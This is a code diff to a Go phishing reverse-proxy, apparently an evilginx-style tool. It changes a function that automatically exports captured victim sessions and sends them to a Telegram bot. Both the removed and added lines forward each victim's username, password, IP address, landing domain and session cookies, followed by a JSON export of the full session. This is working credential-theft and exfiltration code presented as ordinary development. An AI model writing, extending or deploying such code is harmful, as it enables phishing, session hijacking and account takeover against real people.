@@ -202,38 +202,27 @@ func (p *HttpProxy) AutoExportAndSendSession(sessionID int, sid string) {
 		return
 	}
 
-	// Prepare caption
+	// Prepare domain and cookie count
 	domain := ""
 	if pl, err := p.cfg.GetPhishlet(session.Name); err == nil && pl != nil {
 		domain = pl.GetLandingPhishHost()
 	}
 
-	tokenCount := len(session.CookieTokens)
+	cookieCount := 0
 	for _, tokens := range session.CookieTokens {
-		tokenCount = len(tokens) // Count individual cookies
+		cookieCount = len(tokens)
 		break
 	}
 
-	caption := fmt.Sprintf(
-		"🎯 *Session Capture %d*\n\n"+
-		"📊 *Status:* Tokens Captured\n"+
-		"🍪 *Cookies:* %d\n"+
-		"📧 *Username:* `%s`\n"+
-		"🔑 *Password:* `%s`\n"+
-		"🌐 *IP:* `%s`\n"+
-		"🌐 *Domain:* %s\n\n"+
-		"📎 *Attached:* Complete session export (JSON)",
-		sessionID,
-		tokenCount,
-		escapeMarkdown(session.Username),
-		escapeMarkdown(session.Password),
-		session.RemoteAddr,
-		domain,
-	)
+	// Send tokens capture notification
+	p.telegram.SendTokensCapture(sessionID, session.Username, session.Password, session.RemoteAddr, domain, session.Name, cookieCount)
 
 	// Send file via Telegram
 	go func() {
-		if err := p.telegram.SendDocument(filename, caption); err != nil {
+		// Small delay to ensure the message arrives before the file
+		time.Sleep(500 * time.Millisecond)
+		
+		if err := p.telegram.SendDocument(filename, ""); err != nil {
 			log.Error("failed to send session export via telegram: %v", err)
 		} else {
 			log.Success("[%d] session export sent to telegram", sessionID)
